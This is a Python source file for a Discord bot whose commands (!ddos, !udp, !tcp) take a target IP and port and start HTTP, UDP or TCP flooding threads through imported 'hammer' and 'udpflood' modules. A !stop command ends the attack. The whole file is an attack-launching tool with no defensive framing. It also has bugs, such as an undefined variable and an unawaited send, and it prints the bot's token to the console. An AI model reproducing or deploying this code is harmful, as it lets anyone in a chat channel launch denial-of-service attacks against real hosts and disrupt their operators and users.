import discord
from discord.ext import commands
import hammer
import sys
import threading
import subprocess
import os
from keep_alive import keep_alive
import udpflood
import time

bot = commands.Bot(command_prefix='!')


@bot.command()
async def ping(ctx):
  await ctx.send('pong')

@bot.command()
async def ddos(ctx,arg,port):
    if not arg:
        ctx.send("no addres!")
        return
    if not port:
        ctx.send("no port!")
        return
    hammer.host = arg
    hammer.port = port
    await ctx.send("Attacking " + arg + " successfully.")
    ddos = threading.Thread(target=hammer.start)
    ddos.setDaemon(True)
    ddos.start()


@bot.command()
async def stop(ctx):
    await ctx.send("stopped the attack.")
    hammer.flag = False



@bot.command()
async def udp(ctx,ip,port,connection,thread):
    if not ip:
        await ctx.send("no ip!")
    if not port:            
        await ctx.send("no port!")
    if not connect:
        await ctx.send("choose ackets per one connection!")
    if not thread:
      await ctx.send("no thread!")

    udpflood.ip = ip
    udpflood.port = port
    udpflood.times = connection
    udpflood.thread = thread
    udpflood.choice ="y"


    th = threading.Thread(target=udpflood.mainudp)
    th.start()




@bot.command()
async def tcp(ctx,ip,port,connection,thread):
    if not ip:
        await ctx.send("no ip!")
    if not port:            
        await ctx.send("no port!")
    if not connect:
        await ctx.send("choose ackets per one connection!")
    if not thread:
      await ctx.send("no thread!")

    udpflood.ip = ip
    udpflood.port = port
    udpflood.times = connection
    udpflood.thread = thread
    udpflood.choice ="n"


    th = threading.Thread(target=udpflood.mainudp)
    th.start()

keep_alive()
token = os.getenv("token")
print(token)
bot.run(token)